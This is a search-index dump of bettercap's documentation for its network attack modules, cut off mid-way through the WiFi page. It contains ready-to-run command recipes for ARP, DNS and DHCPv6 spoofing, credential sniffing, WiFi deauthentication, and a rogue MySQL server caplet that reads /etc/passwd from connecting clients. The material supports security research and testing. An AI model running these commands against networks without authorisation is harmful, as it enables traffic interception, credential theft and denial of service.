[
{
	"uri": "https://bettercap.org/modules/utils/mac.changer/",
	"title": "mac.changer",
	"tags": [],
	"description": "",
	"content": " Change the selected interface mac address.\nCommands mac.changer on Start the mac changer module.\nmac.changer off Stop the mac changer module and restore the original mac address.\nParameters    parameter default description     mac.changer.iface \u0026lt;interface name\u0026gt; Name of the interface to use.   mac.changer.address \u0026lt;random mac\u0026gt; Hardware address to apply to the interface.    "
},
{
	"uri": "https://bettercap.org/modules/ethernet/servers/http.server/",
	"title": "http.server",
	"tags": [],
	"description": "",
	"content": " A simple HTTP server, used to serve files and scripts across the network.\nCommands http.server on Start the HTTP server in the background.\nhttp.server off Stop the HTTP server in the background.\nParameters    parameter default description     http.server.path . Server folder.   http.server.address \u0026lt;interface address\u0026gt; Address to bind the http server to.   http.server.port 80 Port to bind the http server to.    Examples One liner to serve /var/www/html:\nsudo bettercap -eval \u0026quot;set http.server.path /var/www/html; http.server on\u0026quot;  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/proxies/any.proxy/",
	"title": "any.proxy",
	"tags": [],
	"description": "",
	"content": " A simple firewall redirection to any custom proxy.\nCommands any.proxy on Start the custom proxy redirection.\nany.proxy off Stop the custom proxy redirection.\nParameters    parameter default description     any.proxy.iface \u0026lt;interface name\u0026gt; Interface to redirect packets from.   any.proxy.protocol TCP Proxy protocol.   any.proxy.src_port 80 Remote port to redirect when the module is activated.   any.proxy.src_address  Leave empty to intercept any source address.   any.proxy.dst_address \u0026lt;interface address\u0026gt; Address where the proxy is listening.   any.proxy.dst_port 8080 Port where the proxy is listening.    Examples Redirect all HTTP traffic to a local Burp proxy instance:\nset any.proxy.dst_address 127.0.0.1 any.proxy on  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/spoofers/arp.spoof/",
	"title": "arp.spoof",
	"tags": [],
	"description": "",
	"content": " This module keeps spoofing selected hosts on the network using crafted ARP packets in order to perform a MITM attack.\nCommands arp.spoof on Start ARP spoofer.\narp.ban on Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.\narp.spoof/ban off Stop ARP spoofer.\nParameters    parameter default description     arp.spoof.targets \u0026lt;entire subnet\u0026gt; A comma separated list of MAC addresses, IP addresses, IP ranges or aliases to spoof (a list of supported range formats).   arp.spoof.whitelist  A comma separated list of MAC addresses, IP addresses, IP ranges or aliases to skip while spoofing.   arp.spoof.internal false If true, local connections among computers of the network will be spoofed as well, otherwise only connections going to and coming from the external network.   arp.spoof.fullduplex false If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail).    Examples Ban the address 192.168.1.6 from the network:\n\u0026gt; set arp.spoof.targets 192.168.1.6; arp.ban on  Spoof 192.168.1.2, 192.168.1.3 and 192.168.1.4:\n\u0026gt; set arp.spoof.targets 192.168.1.2-4; arp.spoof on  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/net.recon/",
	"title": "net.recon",
	"tags": [],
	"description": "",
	"content": " This module is enabled by default and is responsible for periodically reading the system ARP table in order to detect new hosts on the network.\nCommands net.recon on Start network hosts discovery.\nnet.recon off Stop network hosts discovery.\nnet.clear Clear all endpoints collected by the hosts discovery module.\nnet.show Show cache hosts list (default sorting by ip).\nnet.show ADDRESS1, ADDRESS2 Show information about a specific list of addresses (by IP or MAC).\nnet.show.meta ADDRESS1, ADDRESS2 Show metadata (mDNS, UPnP, open ports, etc) about a specific list of addresses (by IP or MAC).\nParameters    parameter default description     net.show.meta false If true, the net.show command will show all metadata collected about each endpoint.   net.show.filter  Defines a regular expression filter for net.show.   net.show.sort ip asc Defines sorting field (ip, mac, seen, sent, rcvd) and direction (asc or desc) for net.show.   net.show.limit 0 If greater than zero, defines limit for net.show.    Examples Sort by IP and filter for MAC addresses starting with B8:\n\u0026gt; set net.show.sort ip asc \u0026gt; set net.show.filter ^B8 \u0026gt; net.show  Filter by endpoints with the string Apple in their hostname or vendor fields:\n\u0026gt; set net.show.filter Apple \u0026gt; net.show  Show top 10 endpoints sorted by last activity timestamp:\n\u0026gt; set net.show.sort seen desc \u0026gt; set net.show.limit 10 \u0026gt; net.show  "
},
{
	"uri": "https://bettercap.org/modules/core/events.stream/",
	"title": "events.stream",
	"tags": [],
	"description": "",
	"content": " This module is enabled by default and is responsible for reporting events (logs, new hosts being found, etc) generated by other modules during the interactive session. Moreover, it can be used to programmatically execute commands when specific events occur.\nEvents Each module can generate an event with a custom payload and a unique identifier / tag depending on its meaning:\n   event id description     sys.log Simple log message event.   session.started The session started.   session.closing The session is stopping.   update.available An update is available.   mod.started A specific module started.   mod.stopped A specific module stopped.   endpoint.new A new network host has been discovered.   endpoint.lost A previously discovered network host disconnected from this network.   wifi.ap.new A new WiFi access point has been discovered.   wifi.ap.lost A previously discovered WiFi access point is not in range anymore.   wifi.client.new A new WiFi client station has been discovered.   wifi.client.lost A previously discovered WiFi client station disconnected from its AP.   wifi.client.probe A WiFi client station is sending a probe for an ESSID.   wifi.client.handshake WPA/WPA2 key material has been captured.   ble.device.new A new BLE device has been discovered.   ble.device.lost A previously discovered BLE device is not in range anymore.   ble.device.service.discovered A new service has been discovered for a BLE device.   ble.device.characteristic.discovered A new characteristic has been discovered for a BLE device.   ble.device.connected Connected to the selected BLE device.   ble.connection.timeout Connection to the specified BLE device timed out.   hid.device.new A new wireless HID device has been discovered.   hid.device.lost A previously discovered wireless HID device is not in range anymore.   http.spoofed-request A HTTP request has been changed by a proxy module.   http.spoofed-response A HTTP response has been changed by a proxy module.   https.spoofed-request A HTTPS request has been changed by a proxy module.   https.spoofed-response A HTTPS response has been changed by a proxy module.   syn.scan An open port has been found on the target host.   net.sniff.* A new payload has been sniffed.    Basic Module Commands events.stream on Start the events stream.\nevents.stream off Stop the events stream.\nevents.show LIMIT? Show the events stream ( LIMIT is an optional parameter ).\nevents.ignore FILTER Events with an identifier matching this filter will not be shown (use multiple times to add more filters).\nevents.include FILTER Used to remove filters passed with the events.ignore command.\nevents.filters.clear Clear the list of filters passed with the events.ignore command.\nevents.clear Clear the events stream buffer.\nAdvanced Module Commands events.waitfor TAG TIMEOUT? Wait for an event with the given tag either forever or for a timeout in seconds.\nevents.on TAG COMMANDS Define a new \u0026ldquo;trigger\u0026rdquo; that will run COMMANDS when an event with the specified TAG is triggered. Inside the COMMANDS parameter it is possible to use placeholders that will be replaced with the relative field of the event\u0026rsquo;s payload (it supports XPath queries on JSON between brackets).\nevents.triggers Show the list of event triggers created by the events.on command.\nevents.trigger.delete TRIGGER_ID Remove an event trigger given its TRIGGER_ID (use events.triggers to see the list of triggers).\nevents.triggers.clear Remove all event triggers (use events.triggers to see the list of triggers).\nParameters    parameter default description     events.stream.output  If not empty, events will be written to this file instead of the standard output.   events.stream.output.rotate true If true will enable log rotation.   events.stream.output.rotate.compress true If true will enable log rotation compression.   events.stream.output.rotate.how size Rotate by size or time.   events.stream.output.rotate.when 10485760 File size or time duration in seconds for log rotation.   events.stream.output.rotate.format 2006-01-02 15:04:05 Datetime format to use for log rotation file names.   events.stream.http.request.dump false If true all HTTP requests will be dumped.   events.stream.http.response.dump false If true all HTTP responses will be dumped.    Examples Show every event:\n\u0026gt; events.show  Show the last 5 events, sleep one second and then clear the buffer:\n\u0026gt; events.show 5; sleep 1; events.clear  Ignore the endpoint.lost event:\n\u0026gt; events.ignore endpoint.lost  Re enable the endpoint.lost event:\n\u0026gt; events.include endpoint.lost  Start discovering BLE devices and wait that at least one is detected:\n\u0026gt; ble.recon on; events.waitfor ble.device.new  Same thing but with a 10 seconds timeout:\n\u0026gt; ble.recon on; events.waitfor ble.device.new 10  Whenever a new WiFi client station is discovered, launch a deauthentication attack and, whenever a new WiFi access point is discovered, try to associate to it:\n\u0026gt; events.on wifi.client.new wifi.deauth {{Client/mac}} \u0026gt; events.on wifi.ap.new wifi.assoc {{mac}}  Start bettercap without colors and terminal effects and write events to the file ~/bettercap-events.log:\nsudo bettercap -no-colors -eval \u0026quot;set events.stream.output ~/bettercap-events.log\u0026quot;  "
},
{
	"uri": "https://bettercap.org/modules/core/",
	"title": "Core",
	"tags": [],
	"description": "",
	"content": "Core modules used to instrument and perform basic interaction with bettercap and other modules:\n events.stream     ticker     caplets     update     api.rest     "
},
{
	"uri": "https://bettercap.org/intro/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": " bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices and Ethernet networks.\nMain Features  WiFi networks scanning, deauthentication attack, clientless PMKID association attack and automatic WPA/WPA2 client handshakes capture. Bluetooth Low Energy devices scanning, characteristics enumeration, reading and writing. 2.4Ghz wireless devices scanning and MouseJacking attacks with over-the-air HID frames injection (with DuckyScript support). Passive and active IP network hosts probing and recon. ARP, DNS and DHCPv6 spoofers for MITM attacks on IP based networks. Proxies at packet level, TCP level and HTTP/HTTPS application level fully scriptable with easy to implement javascript plugins. A powerful network sniffer for credentials harvesting which can also be used as a network protocol fuzzer. A very fast port scanner. A powerful REST API with support for asynchronous events notification on websocket to orchestrate your attacks easily. More!   @evilsocket bettercap has done to the networking and wireless world what @metasploit did for the exploitation world. I can\u0026#39;t recommend a better tool. Long live bettercap and long live go.\n\u0026mdash; Jack Zimmer (@Zimmer_Security) 13 febbraio 2019 \nAbout the 1.x Legacy Version While the first version (up to 1.6.2) of bettercap was implemented in Ruby and only offered basic MITM, sniffing and proxying capabilities, the 2.x is a complete reimplementation using the Go programming language.\nThis ground-up rewrite offered several advantages:\n bettercap can now be distributed as a single binary with very few dependencies, for basically any OS and any architecture. 1.x proxies, altough highly optimized and event based, used to bottleneck the entire network when performing a MITM attack, while the new version adds almost no overhead. Due to such performance and functional limitations, most of the features that the 2.x version is offering were simply impossible to implement properly (read as: without killing the entire network \u0026hellip; or your computer).  For this reason, any version prior to 2.x is considered deprecated and any type of support has been dropped in favor of the new implementation. An archived copy of the legacy documentation is available here, however it is strongly suggested to upgrade.\n"
},
{
	"uri": "https://bettercap.org/modules/utils/gps/",
	"title": "gps",
	"tags": [],
	"description": "",
	"content": " This module can be used to obtain GPS coordinates from any receiver which exposes a serial interface.\nCommands gps on Start acquiring from the GPS hardware.\ngps off Stop acquiring from the GPS hardware.\ngps.show Show the last coordinates returned by the GPS hardware.\nParameters    parameter default description     gps.device /dev/ttyUSB0 Serial device of the GPS hardware.   gps.baudrate 19200 Baud rate of the GPS serial device.    Examples Turn on GPS, wait for 5 seconds and then show the current coordinates:\n\u0026gt; gps on; sleep 5; gps.show  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/servers/https.server/",
	"title": "https.server",
	"tags": [],
	"description": "",
	"content": " A simple HTTPS server, used to serve files and scripts across the network.\nCommands https.server on Start the HTTP server in the background.\nhttps.server off Stop the HTTP server in the background.\nParameters    parameter default description     https.server.path . Server folder.   https.server.address \u0026lt;interface address\u0026gt; Address to bind the http server to.   https.server.port 443 Port to bind the http server to.   https.server.certificate ~/.bettercap-https.cert.pem TLS certificate file (will be auto generated if filled but not existing).   https.server.key ~/.bettercap-https.key.pem TLS key file (will be auto generated if filled but not existing).   https.server.certificate.bits 4096 Number of bits of the RSA private key of the generated HTTPS certificate.   https.server.certificate.commonname bettercap Common Name field of the generated HTTPS certificate.   https.server.certificate.country US Country field of the generated HTTPS certificate.   https.server.certificate.locality  Locality field of the generated HTTPS certificate.   https.server.certificate.organization bettercap devteam Organization field of the generated HTTPS certificate.   https.server.certificate.organizationalunit https://bettercap.org/ Organizational Unit field of the generated HTTPS certificate.    Examples One liner to serve /var/www/html:\nsudo bettercap -eval \u0026quot;set https.server.path /var/www/html; https.server on\u0026quot;  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/proxies/packet.proxy/",
	"title": "packet.proxy",
	"tags": [],
	"description": "",
	"content": " A module that relies on NFQUEUEs in order to actively filter packets, using Go native plugins (plugins for this module can be found in this repository).\nThis module is only supported on GNU/Linux.\n Commands packet.proxy on Start the NFQUEUE based packet proxy.\npacket.proxy off Stop the NFQUEUE based packet proxy.\nParameters    parameter default description     packet.proxy.queue.num 0 NFQUEUE number to create and bind to.   packet.proxy.chain OUTPUT Chain name of the iptables rule.   packet.proxy.rule  Any additional iptables rule to make the queue more selective (ex. --destination 8.8.8.8).   packet.proxy.plugin  Go plugin file to load and call for every packet.    Plugins Instead of using Javascript extensions like the HTTP and HTTPS proxies, this module requires the plugins to be natively written in Go in order to avoid adding too much overhead for each incoming packet. The packet.proxy.plugin parameter is mandatory and needs to be filled with the path of a shared object built as a Go plugin and exporting an OnPacket callback like the following:\npackage main import ( \u0026quot;github.com/bettercap/bettercap/log\u0026quot; \u0026quot;github.com/chifflier/nfqueue-go/nfqueue\u0026quot; ) func OnPacket(payload *nfqueue.Payload) int { log.Info(\u0026quot;We got a packet: %v\u0026quot;, payload) // this will accept the packet, use NF_DROP to // drop the packet instead. payload.SetVerdict(nfqueue.NF_ACCEPT) return 0 }  A more complex example using the gopacket library to parse and dump all the layers of the packet:\npackage main import ( \u0026quot;github.com/bettercap/bettercap/log\u0026quot; \u0026quot;github.com/chifflier/nfqueue-go/nfqueue\u0026quot; \u0026quot;github.com/google/gopacket\u0026quot; \u0026quot;github.com/google/gopacket/layers\u0026quot; ) func OnPacket(payload *nfqueue.Payload) int { packet := gopacket.NewPacket(payload.Data, layers.LayerTypeIPv4, gopacket.Default) log.Info(\u0026quot;%s\u0026quot;, packet.Dump()) payload.SetVerdict(nfqueue.NF_ACCEPT) return 0 }  This test.go file can be compiled like so:\ngo build -buildmode=plugin test.go  Once the test.so file is generated, it can be used for the packet.proxy.plugin parameter.\nIn order to be compiled correctly, plugin .go files need to be copied inside bettercap\u0026rsquo;s source folder and compiled from there, otherwise you might have issues compiling due to dependency conflicts with the vendor folder.\n "
},
{
	"uri": "https://bettercap.org/modules/ethernet/spoofers/dns.spoof/",
	"title": "dns.spoof",
	"tags": [],
	"description": "",
	"content": " Replies to DNS queries with spoofed responses.\nIn order to receive DNS queries from other hosts other than your own and be therefore able to spoof the selected domain names, you\u0026rsquo;ll also need to activate either the arp.spoof or the dhcp6.spoof module.\n Commands dns.spoof on Start the DNS spoofer in the background.\ndns.spoof off Stop the DNS spoofer in the background.\nParameters    parameter default description     dns.spoof.domains  Comma separated values of domain names to spoof.   dns.spoof.address \u0026lt;interface address\u0026gt; IP address to map the domains to.   dns.spoof.all false If true the module will reply to every DNS request, otherwise it will only reply to the one targeting the local pc.   dns.spoof.hosts  If not empty, this hosts file will be used to map domains to IP addresses.    Examples Every DNS request coming to this computer for the example.com domain will resolve to the address 1.2.3.4:\n\u0026gt; set dns.spoof.domains example.com; set dns.spoof.address 1.2.3.4; dns.spoof on  Use a hosts file instead of the dns.spoof.* parameters for multiple mappings:\n\u0026gt; !cat ./dns.spoof.hosts 1.2.3.4 facebook.com 1.2.3.5 cnn.com 1.2.4.6 www.google.com \u0026gt; set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/net.probe/",
	"title": "net.probe",
	"tags": [],
	"description": "",
	"content": " When activated, this module will send different types of probe packets to each IP in the current subnet in order for the net.recon module to detect them.\nCommands net.probe on Start the prober.\nnet.probe off Stop the prober.\nParameters    parameter default description     net.probe.throttle 10 If greater than 0, probe packets will be throttled by this value in milliseconds.   net.probe.mdns true Enable mDNS discovery probes.   net.probe.nbns true Enable NetBIOS name system (NBNS) discovery probes.   net.probe.upnp true Enable UPnP discovery probes.   net.probe.wsd true Enable WSD discovery probes.    "
},
{
	"uri": "https://bettercap.org/modules/core/ticker/",
	"title": "ticker",
	"tags": [],
	"description": "",
	"content": " The ticker module can be used to execute a given set of commands periodically in the interactive session.\nCommands ticker on Start the ticker.\nticker off Stop the ticker.\nParameters    parameter default description     ticker.commands clear; net.show List of commands separated by a ;.   ticker.period 1 Ticker period in seconds.    Examples Start probing for hosts, clear the screen and plot discovered endpoints every second (will use default parameters):\n\u0026gt; net.probe on; clear; ticker on  Keep deauthenticating clients from the access point with BSSID DE:AD:BE:EF:DE:AD every five seconds:\n\u0026gt; set ticker.period 5; set ticker.commands \u0026quot;wifi.deauth DE:AD:BE:EF:DE:AD\u0026quot;; ticker on  "
},
{
	"uri": "https://bettercap.org/contributing/",
	"title": "Contributing",
	"tags": [],
	"description": "",
	"content": " As any other open source projects, there\u0026rsquo;re many ways you can contribute to bettercap depending on your skills as a developer or will to help as a user.\nImproving the Documentation You can improve this documentation by forking its repository, updating the contents and sending a pull request.\nReporting Bugs If you find bugs or inconsistencies while using bettercap, you can create an Issue using the GitHub Issue tracker, but before doing that please make sure that:\n You read this documentation. You are using the latest stable version of bettercap. You already searched other issues to see if your problem or request was already reported.  Once you\u0026rsquo;ve gone through this list, open an issue and please give us as much as informations as possible in order for us to fix the bug as soon as possible, such as:\n bettercap version you are using. Go version if building from sources. OS version and architecture you are using. Command line arguments you are using. Caplet code you are using or the interactive session commands. Full debug output while reproducing the issue ( bettercap -debug ... ). The steps to reproduce the bug.  Sending a Pull Request If you know how to code in Go and have ideas to improve bettercap, you\u0026rsquo;re very welcome to send us pull requests, we\u0026rsquo;ll be happy to merge them whenever they comply to the following rules:\n You have at least manually tested your code, ideally you\u0026rsquo;ve created actual tests for it. Respect our coding standard, 2 spaces indentation and modular code. There\u0026rsquo;re no conflicts with the current master branch. Your commit messages are enough explanatory to us.  There\u0026rsquo;re plenty of things you can to do improve the software:\n Implement a new session module (in Go). Implement a new proxy module (in Javascript). Implement a new caplet. Fix, extend or improve the core.  "
},
{
	"uri": "https://bettercap.org/modules/ble/",
	"title": "Bluetooth LE",
	"tags": [],
	"description": "",
	"content": " This module is responsible for Bluetooth Low Energy devices discovery, services enumeration and characteristic writing for unauthenticated devices.\nThis module is not supported on Microsoft Windows and Apple macOS due to this bug.\n Commands ble.recon on Start Bluetooth Low Energy devices discovery.\nble.recon off Stop Bluetooth Low Energy devices discovery.\nble.clear Clear all devices collected by the BLE discovery module.\nble.show Show discovered Bluetooth Low Energy devices.\nble.enum MAC Enumerate services and characteristics for the given BLE device.\nble.write MAC UUID HEX_DATA Write the HEX_DATA buffer to the BLE device with the specified MAC address, to the characteristics with the given UUID. |\nParameters    parameter default description     ble.show.filter  Defines a regular expression filter for ble.show.   ble.show.sort rssi asc Defines sorting field (rssi, mac, or seen) and direction (asc or desc) for ble.show.   ble.show.limit 0 If greater than zero, defines limit for ble.show.    Examples Connect, enumerate and read characteristics from the BLE device 04:52:de:ad:be:ef (requires ble.recon on first):\n\u0026gt; ble.enum 04:52:de:ad:be:ef  Write the bytes ff ff ff ff ff ff ff ff to the BLE device 04:52:de:ad:be:ef on its characteristics with UUID 234bfbd5e3b34536a3fe723620d4b78d (requires ble.recon on first):\n\u0026gt; ble.write 04:52:de:ad:be:ef 234bfbd5e3b34536a3fe723620d4b78d ffffffffffffffff  Hacking a Loccess smartlock using bettercap:\n "
},
{
	"uri": "https://bettercap.org/modules/ethernet/servers/mysql.server/",
	"title": "mysql.server (rogue)",
	"tags": [],
	"description": "",
	"content": " A rogue MySQL server that can be used to exploit LOCAL INFILE and read arbitrary files from the client.\nCommands mysql.server on Start mysql server.\nmysql.server off Stop mysql server.\nParameters    parameter default description     mysql.server.infile /etc/passwd File you want to read. UNC paths are also supported.   mysql.server.outfile  If filled, the INFILE buffer will be saved to this path instead of being logged.   mysql.server.address \u0026lt;interface address\u0026gt; Address to bind the mysql server to.   mysql.server.port 3306 Port to bind the mysql server to.   mysql.server.outfile If filled, the INFILE buffer will be saved to this path instead of being logged.     Examples\nOne liner to start the server and steal /etc/passwd from clients connecting to your Rogue MySQL server\n$ sudo bettercap -eval \u0026quot;set mysql.server.infile /etc/hosts; mysql.server on\u0026quot;  Now connect to your MySQL server and observe the file output on the Bettercap terminal\n$ mysql -u root -h 192.168.1.123 -pasdsasad --enable-local-infile  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/proxies/tcp.proxy/",
	"title": "tcp.proxy",
	"tags": [],
	"description": "",
	"content": " A TCP transparent proxy that can be scripted using javascript modules. If used together with a spoofer, all TCP traffic to a given address and port will be redirected to it and it will automatically handle port redirections as needed.\nThe optional tcp.tunnel parameter can be used to redirect the traffic from tcp.address to tcp.tunnel.address.\nCommands tcp.proxy on Start the TCP proxy.\ntcp.proxy off Stop the TCP proxy.\nParameters    parameter default description     tcp.port 443 TCP port to redirect when the proxy is activated.   tcp.address  Mandatory remote address of the TCP proxy.   tcp.proxy.port 8443 Port to bind the TCP proxy to.   tcp.proxy.address \u0026lt;interface address\u0026gt; Address to bind the TCP proxy to.   tcp.proxy.script  Path of a proxy module script.   tcp.tunnel.address  Address to redirect the TCP tunnel to (optional).   tcp.tunnel.port  Port to redirect the TCP tunnel to (optional)    Modules The tcp.proxy module can be scripted using javascript files that must declare at least one of the following functions:\n// called when the script is loaded function onLoad() { } // called when data is available // return an array of bytes to override \u0026quot;data\u0026quot; function onData(from, to, data) { }  Modules can change the data buffer and return it, signaling the proxy to override the original buffer.\nBuiltin Functions Modules can use the following builtin functions.\n   function description     readDir(\u0026quot;/path/\u0026quot;) Return the contents of a directory as a string array.   readFile(\u0026quot;/path/to/file\u0026quot;) Return the contents of a file as a string.   writeFile(\u0026quot;/path/to/file\u0026quot;, \u0026quot;hello world\u0026quot;) Write the string hello world to a file, returns null or an error message.   log_debug(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be DEBUG).   log_info(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be INFO).   log_warn(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be WARNING).   log_error(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be ERROR).   log_fatal(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be FATAL).   log(\u0026quot;message\u0026quot;) Shortcut for log_info(\u0026quot;message\u0026quot;).   btoa(\u0026quot;message\u0026quot;) Encode a message to base64.   atob(\u0026quot;bWVzc2FnZQ==\u0026quot;) Decode a message from base64.   env(\u0026quot;iface.ipv4\u0026quot;) Read a variable.   env(\u0026quot;foo\u0026quot;, \u0026quot;bar\u0026quot;) Set a variable.    Examples The rogue-mysql-server.cap executes an ARP spoofing attack against a single host and redirect the MySQL traffic to a builtin rogue server:\n# set the target for arp spoofing set arp.spoof.targets 192.168.1.236 # bind rogue mysql server to localhost and # set the file we want to read set mysql.server.address 127.0.0.1 set mysql.server.port 3306 set mysql.server.infile /etc/passwd mysql.server on # set the ip from the mysql server we want to impersonate set tcp.address 93.184.216.34 set tcp.port 3306 # set the ip from the rogue mysql server set tcp.tunnel.address 127.0.0.1 set tcp.tunnel.port 3306 # go ^_^ tcp.proxy on arp.spoof on  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/spoofers/dhcp6.spoof/",
	"title": "dhcp6.spoof",
	"tags": [],
	"description": "",
	"content": " This module\u0026rsquo;s purpose is attacking Microsoft Windows hosts by replying to DHCPv6 messages and providing the target with a link-local IPv6 address and setting the attacker host as default DNS server (as described here).\nThis module must be used together with dns.spoof module in order to be effective.\n Commands dhcp6.spoof on Start the DHCPv6 spoofer in the background.\ndhcp6.spoof off Stop the DHCPv6 spoofer in the background.\nParameters    parameter default description     dhcp6.spoof.domains microsoft.com, goole.com, facebook.com, apple.com, twitter.com Comma separated values of domain names to spoof.    Examples The following is the mitm6.cap caplet performing the full DHCPv6 attack versus a Windows 10 machine which is booting:\n# let's spoof Microsoft and Google ^_^ set dns.spoof.domains microsoft.com, google.com set dhcp6.spoof.domains microsoft.com, google.com # every http request to the spoofed hosts will come to us # let's give em some contents set http.server.path /var/www/something # serve files http.server on # redirect DNS request by spoofing DHCPv6 packets dhcp6.spoof on # send spoofed DNS replies ^_^ dns.spoof on # set a custom prompt for ipv6 set $ {by}{fw}{cidr} {fb}\u0026gt; {env.iface.ipv6} {reset} {bold}» {reset} # clear the events buffer and the screen events.clear clear  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/net.sniff/",
	"title": "net.sniff - net.fuzz",
	"tags": [],
	"description": "",
	"content": " This module is a network packet sniffer and fuzzer supporting both BPF syntax and regular expressions for filtering. It is also able to dissect several major protocols in order to harvest credentials.\nCommands net.sniff on Start the packet sniffer.\nnet.sniff off Stop the packet sniffer.\nnet.sniff stats Print the packet sniffer session configuration and statistics.\nnet.fuzz on Enable fuzzing for every sniffed packet containing the sapecified layers.\nnet.fuzz off Disable fuzzing.\nParameters    parameter default description     net.sniff.output  If set, the sniffer will write captured packets to this pcap file.   net.sniff.source  If set, the sniffer will read from this pcap file instead of the current interface.   net.sniff.verbose false If true, every captured and parsed packet will be sent to the events.stream for displaying, otherwise only the ones parsed at the application layer (sni, http, etc).   net.sniff.local false If true it will consider packets from/to this computer, otherwise it will skip them.   net.sniff.filter not arp BPF filter for the sniffer.   net.sniff.regexp  If set, only packets with a payload matching this regular expression will be considered.   net.fuzz.layers Payload Comma separated types of layer to fuzz.   net.fuzz.rate 1.0 Rate in the [0.0,1.0] interval of packets to fuzz.   net.fuzz.ratio 0.4 Rate in the [0.0,1.0] interval of bytes to fuzz for each packet.   net.fuzz.silent false If true it will not report fuzzed packets.    Examples The local-sniffer.cap caplet will sniff, parse and print all packets on the local machine:\nevents.clear set net.sniff.verbose false set net.sniff.local true # uncomment to skip ARP and DNS requests # set net.sniff.filter \u0026quot;not arp and not udp port 53\u0026quot; net.sniff on  Change 90% of mDNS incoming packets by fuzzing 40% of their payload (will reinject fuzzed packets):\nset net.sniff.verbose true set net.fuzz.rate 0.9 set net.fuzz.ratio 0.4 set net.fuzz.silent false set net.fuzz.layers Payload set net.sniff.filter \u0026quot;host 224.0.0.251 and port 5353\u0026quot; net.fuzz on  Change 100% of WiFi packets by fuzzing 70% of their Dot11InformationElement and Dot11Data layers:\nset net.sniff.verbose true set net.fuzz.rate 1.0 set net.fuzz.ratio 0.7 set net.fuzz.layers Dot11InformationElement, Dot11Data net.fuzz on  "
},
{
	"uri": "https://bettercap.org/modules/core/caplets/",
	"title": "caplets",
	"tags": [],
	"description": "",
	"content": " A module to list and update caplets.\nCommands caplets.show Show a list of installed caplets.\ncaplets.paths Show a list caplet search paths.\ncaplets.update Install/updates the caplets.\nExamples \n"
},
{
	"uri": "https://bettercap.org/modules/wifi/",
	"title": "WiFi",
	"tags": [],
	"description": "",
	"content": " The WiFi modules use a WiFi interface supporting monitor mode and packet injection in order to:\n scan the 802.11 spectrum perform deauthentication attacks on connected client stations perform RSN PMKID based clientless attacks on vulnerable access points automatically sniff and save key material either from complete WPA/WPA2 handshakes or PMKID packets. send spoofed management beacons to create fake access points.  The interface only needs to support monitor mode and packet injection, it\u0026rsquo;ll be bettercap itself to switch it to the right mode, just make sure there aren\u0026rsquo;t other processes using the same wifi interface.\n This modules are natively supported on macOS with the default interface en0. Just make sure the interface is not connected to any WiFi network and then start bettercap with:  sudo bettercap -iface en0\n Commands wifi.recon on Start 802.11 wireless base stations discovery and handshakes/PMKID capture.\nwifi.recon off Stop 802.11 wireless base stations discovery.\nwifi.clear Clear all access points collected by the WiFi discovery module.\nwifi.recon BSSID Set 802.11 base station address to filter for.\nwifi.recon clear Remove the 802.11 base station filter.\nwifi.assoc BSSID Send an association request to the selected BSSID in order to receive a RSN PMKID key (use all, * or ff:ff:ff:ff:ff:ff to iterate for every access point).\nwifi.deauth BSSID Start a 802.11 deauth attack, if an access point BSSID is provided, every client will be deauthenticated, otherwise only the selected client (use all, * or ff:ff:ff:ff:ff:ff to deauth everything).\nwifi.show Show current wireless stations list (default sorting by RSSI).\nwifi.show.wps BSSID Show WPS information about a given station (use all, * or ff:ff:ff:ff:ff:ff to select all).\nwifi.recon.channel CHANNEL Comma separated list of channels to hop on.\nwifi.recon.channel clear Enable channel hopping on all supported channels.\nwifi.ap Inject fake management beacons in order to create a rogue access point ( requires wifi.recon to run ).\nParameters    parameter default description     wifi.region BO Set the WiFi region to this value before activating the interface.   wifi.txpower 30 Set WiFi transmission power to this value before activating the interface.   wifi.rssi.min -200 Minimum WiFi signal strength in dBm.   wifi.show.manufacturer false If true, wifi.show will also show the devices manufacturers.   wifi.show.filter  Defines a regular expression filter for wifi.show.   wifi.show.sort rssi asc Defines sorting field (rssi, bssid, essid, channel, encryption, clients, seen, sent, rcvd) and direction (asc or desc) for wifi.show.   wifi.show.sort asc Defines sorting direction for wifi.show.   wifi.show.limit 0 If greater than zero, defines limit for wifi.show.   wifi.hop.period 250 If channel hopping is enabled (empty wifi.recon.channel), this is the time in millseconds the algorithm will hop on every channel (it\u0026rsquo;ll be doubled if both 2.4 and 5.0 bands are available).   wifi.handshakes.file ~/bettercap-wifi-handshakes.pcap File path of the pcap file to save handshakes to.   wifi.source.file  If set, the wifi module will read from this pcap file instead of the hardware interface.   wifi.skip-broken true If true, dot11 packets with an invalid checksum will be skipped.   wifi.assoc.skip  Comma separated list of BSSID to skip while sending association requests.   wifi.assoc.silent false If true, messages from wifi.assoc will be suppressed.   wifi.assoc.open false Send association requests to open networks.   wifi.deauth.skip  Comma separated list of BSSID to skip while sending deauth packets.   wifi.deauth.silent false If true, messages from wifi.deauth will be suppressed.   wifi.deauth.open true Send wifi deauth packets to open networks.   wifi.ap.ssid FreeWifi SSID of the fake access point.   wifi.ap.bssid \u0026lt;random mac\u0026gt; BSSID of the fake access point.   wifi.ap.channel 1 Channel of the fake access point.   wifi.ap.encryption true If true, the fake access point will use WPA2, otherwise it\u0026rsquo;ll result as an open AP.    Examples Keep deauthing clients from the access point with BSSID DE:AD:BE:EF:DE:AD every five seconds:\n\u0026gt; set ticker.period 5; set ticker.commands \u0026quot;wifi.deauth DE:AD:BE:EF:DE:AD\u0026quot;; ticker on  Use the ticker and 